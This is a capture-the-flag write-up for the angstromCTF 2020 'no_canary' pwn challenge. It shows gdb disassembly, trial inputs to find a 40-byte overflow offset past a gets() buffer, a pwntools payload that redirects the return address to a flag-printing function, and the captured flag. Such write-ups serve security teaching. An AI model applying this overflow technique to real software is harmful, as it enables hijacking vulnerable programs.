### Challenge

```
Agriculture is the most healthful, most useful and most noble employment of man.

—George Washington

Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/no_canary or by connecting with nc shell.actf.co 20700.
```

### Recon

```
kali@kali:~/Downloads$ chmod +x no_canary 
kali@kali:~/Downloads$ gdb ./no_canary 
GNU gdb (Debian 8.3.1-1) 8.3.1
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./no_canary...
(No debugging symbols found in ./no_canary)
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401199 <+0>:     push   %rbp
   0x000000000040119a <+1>:     mov    %rsp,%rbp
   0x000000000040119d <+4>:     sub    $0x20,%rsp
   0x00000000004011a1 <+8>:     mov    0x2ec8(%rip),%rax        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004011a8 <+15>:    mov    $0x0,%ecx
   0x00000000004011ad <+20>:    mov    $0x2,%edx
   0x00000000004011b2 <+25>:    mov    $0x0,%esi
   0x00000000004011b7 <+30>:    mov    %rax,%rdi
   0x00000000004011ba <+33>:    callq  0x401090 <setvbuf@plt>
   0x00000000004011bf <+38>:    mov    0x2e9a(%rip),%rax        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x00000000004011c6 <+45>:    mov    $0x0,%ecx
   0x00000000004011cb <+50>:    mov    $0x2,%edx
   0x00000000004011d0 <+55>:    mov    $0x0,%esi
   0x00000000004011d5 <+60>:    mov    %rax,%rdi
   0x00000000004011d8 <+63>:    callq  0x401090 <setvbuf@plt>
   0x00000000004011dd <+68>:    mov    $0x0,%eax
   0x00000000004011e2 <+73>:    callq  0x401080 <getegid@plt>
   0x00000000004011e7 <+78>:    mov    %eax,-0x4(%rbp)
   0x00000000004011ea <+81>:    mov    -0x4(%rbp),%edx
   0x00000000004011ed <+84>:    mov    -0x4(%rbp),%ecx
   0x00000000004011f0 <+87>:    mov    -0x4(%rbp),%eax
   0x00000000004011f3 <+90>:    mov    %ecx,%esi
   0x00000000004011f5 <+92>:    mov    %eax,%edi
   0x00000000004011f7 <+94>:    mov    $0x0,%eax
   0x00000000004011fc <+99>:    callq  0x401040 <setresgid@plt>
   0x0000000000401201 <+104>:   lea    0xe18(%rip),%rdi        # 0x402020
   0x0000000000401208 <+111>:   callq  0x401030 <puts@plt>
   0x000000000040120d <+116>:   lea    0xe3a(%rip),%rdi        # 0x40204e
   0x0000000000401214 <+123>:   callq  0x401030 <puts@plt>
   0x0000000000401219 <+128>:   lea    0xe45(%rip),%rdi        # 0x402065
   0x0000000000401220 <+135>:   callq  0x401030 <puts@plt>
   0x0000000000401225 <+140>:   lea    0xe50(%rip),%rdi        # 0x40207c
--Type <RET> for more, q to quit, c to continue without paging--
   0x000000000040122c <+147>:   callq  0x401030 <puts@plt>
   0x0000000000401231 <+152>:   lea    0xe5b(%rip),%rdi        # 0x402093
   0x0000000000401238 <+159>:   callq  0x401030 <puts@plt>
   0x000000000040123d <+164>:   lea    0xe66(%rip),%rdi        # 0x4020aa
   0x0000000000401244 <+171>:   callq  0x401030 <puts@plt>
   0x0000000000401249 <+176>:   lea    0xe71(%rip),%rdi        # 0x4020c1
   0x0000000000401250 <+183>:   callq  0x401030 <puts@plt>
   0x0000000000401255 <+188>:   lea    0xe7c(%rip),%rdi        # 0x4020d8
   0x000000000040125c <+195>:   callq  0x401030 <puts@plt>
   0x0000000000401261 <+200>:   lea    0xe59(%rip),%rdi        # 0x4020c1
   0x0000000000401268 <+207>:   callq  0x401030 <puts@plt>
   0x000000000040126d <+212>:   lea    0xe7b(%rip),%rdi        # 0x4020ef
   0x0000000000401274 <+219>:   callq  0x401030 <puts@plt>
   0x0000000000401279 <+224>:   lea    0xe90(%rip),%rdi        # 0x402110
   0x0000000000401280 <+231>:   callq  0x401030 <puts@plt>
   0x0000000000401285 <+236>:   lea    0xea4(%rip),%rdi        # 0x402130
   0x000000000040128c <+243>:   callq  0x401030 <puts@plt>
   0x0000000000401291 <+248>:   lea    0xec0(%rip),%rdi        # 0x402158
   0x0000000000401298 <+255>:   callq  0x401030 <puts@plt>
   0x000000000040129d <+260>:   lea    0xed7(%rip),%rdi        # 0x40217b
   0x00000000004012a4 <+267>:   mov    $0x0,%eax
   0x00000000004012a9 <+272>:   callq  0x401060 <printf@plt>
   0x00000000004012ae <+277>:   lea    -0x20(%rbp),%rax
   0x00000000004012b2 <+281>:   mov    %rax,%rdi
   0x00000000004012b5 <+284>:   mov    $0x0,%eax
   0x00000000004012ba <+289>:   callq  0x401070 <gets@plt>
   0x00000000004012bf <+294>:   lea    -0x20(%rbp),%rax
   0x00000000004012c3 <+298>:   mov    %rax,%rsi
   0x00000000004012c6 <+301>:   lea    0xec1(%rip),%rdi        # 0x40218e
   0x00000000004012cd <+308>:   mov    $0x0,%eax
   0x00000000004012d2 <+313>:   callq  0x401060 <printf@plt>
   0x00000000004012d7 <+318>:   mov    $0x0,%eax
   0x00000000004012dc <+323>:   leaveq 
--Type <RET> for more, q to quit, c to continue without paging--
   0x00000000004012dd <+324>:   retq   
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setresgid@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  gets@plt
0x0000000000401080  getegid@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  _start
0x00000000004010d0  _dl_relocate_static_pie
0x00000000004010e0  deregister_tm_clones
0x0000000000401110  register_tm_clones
0x0000000000401150  __do_global_dtors_aux
0x0000000000401180  frame_dummy
0x0000000000401186  flag
0x0000000000401199  main
0x00000000004012e0  __libc_csu_init
0x0000000000401350  __libc_csu_fini
0x0000000000401358  _fini
(gdb) disas flag
Dump of assembler code for function flag:
   0x0000000000401186 <+0>:     push   %rbp
   0x0000000000401187 <+1>:     mov    %rsp,%rbp
   0x000000000040118a <+4>:     lea    0xe77(%rip),%rdi        # 0x402008
   0x0000000000401191 <+11>:    callq  0x401050 <system@plt>
   0x0000000000401196 <+16>:    nop
   0x0000000000401197 <+17>:    pop    %rbp
   0x0000000000401198 <+18>:    retq   
End of assembler dump.
(gdb) run <<< $(python -c "print 'A'*100")
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*100")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012dd in main ()
(gdb) run <<< $(python -c "print 'A'*50")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*50")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012dd in main ()
(gdb) run <<< $(python -c "print 'A'*25")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*25")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAA!
[Inferior 1 (process 1674) exited normally]
(gdb) run <<< $(python -c "print 'A'*35")
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*35")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
[Inferior 1 (process 1676) exited normally]
(gdb) run <<< $(python -c "print 'A'*45")
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*45")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Program received signal SIGSEGV, Segmentation fault.
0x0000004141414141 in ?? ()
(gdb) run <<< $(python -c "print 'A'*40")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*40")
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e1db00 in __libc_start_main (main=0x401199 <main>, argc=-17680, argv=0x7fffffffe288, init=0x0, fini=0x7ffff7fb8500, rtld_fini=0x3c, stack_end=0x7fffffffe278)
    at ../csu/libc-start.c:141
141     ../csu/libc-start.c: No such file or directory.
(gdb) run <<< $(python -c "print 'A'*40+'\x86\x11\x40\x00\x00\x00\x00\x00'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/no_canary <<< $(python -c "print 'A'*40+'\x86\x11\x40\x00\x00\x00\x00\x00'")
/bin/bash: warning: command substitution: ignored null byte in input
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@!

Program received signal SIGSEGV, Segmentation fault.
0x00007fff00401186 in ?? ()

```

### Test

```
kali@kali:~/Downloads$ python no_canary_exploit.py 
[!] Could not find executable 'no_canary' in $PATH, using './no_canary' instead
[+] Starting local process './no_canary': pid 1840
[*] Switching to interactive mode
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? $ 
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x11!
/bin/cat: flag.txt: No such file or directory
[*] Got EOF while reading in interactive
$ 
[*] Process './no_canary' stopped with exit code -11 (SIGSEGV) (pid 1840)
[*] Got EOF while sending in interactive
None

```

### Solve

```
Welcome to the
                       _                            _    __
   ()                 | |                          | |  / _|
  __ _ _ __   __ _ ___| |_ _ __ ___  _ __ ___   ___| |_| |_
 / _` | '_ \ / _` / __| __| '__/ _ \| '_ ` _ \ / __| __|  _|
| (_| | | | | (_| \__ \ |_| | | (_) | | | | | | (__| |_| |
 \__,_|_| |_|\__, |___/\__|_|  \___/|_| |_| |_|\___|\__|_|
              __/ |
             |___/

shell server!

*==============================================================================*
*  Please be respectful of other users. Abuse may result in disqualification.  *
*Data can be wiped at ANY TIME with NO WARNING. Keep backups of important data!*
*==============================================================================*
Last login: Sun Mar 15 06:31:35 2020 from 127.0.0.1
team6220@actf:~$
team6220@actf:~$
team6220@actf:~$ ls
team6220@actf:~$ cd /problems
team6220@actf:/problems$ ls
2018  2019  2020
team6220@actf:/problems$ cd 2020
team6220@actf:/problems/2020$ ls
a_happy_family    bop_it            canary    just_rust     masochistic_sudoku  patcherman  signal_of_hope
autorev_assemble  califrobnication  inputter  library_in_c  no_canary           revving_up  taking_off
team6220@actf:/problems/2020$ cd no_canary/
team6220@actf:/problems/2020/no_canary$ ls
flag.txt  no_canary  no_canary.c
team6220@actf:/problems/2020/no_canary$ python
Python 2.7.12 (default, Oct  8 2019, 14:14:10)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
>>> conn = process("no_canary")
[!] Could not find executable 'no_canary' in $PATH, using './no_canary' instead
[x] Starting local process './no_canary'
[+] Starting local process './no_canary': pid 16763
>>> conn.send("A"*40 + p64(0x401186))
>>> conn.interactive()
[*] Switching to interactive mode
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name?
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
actf{that_gosh_darn_canary_got_me_pwned!}
[*] Got EOF while reading in interactive
```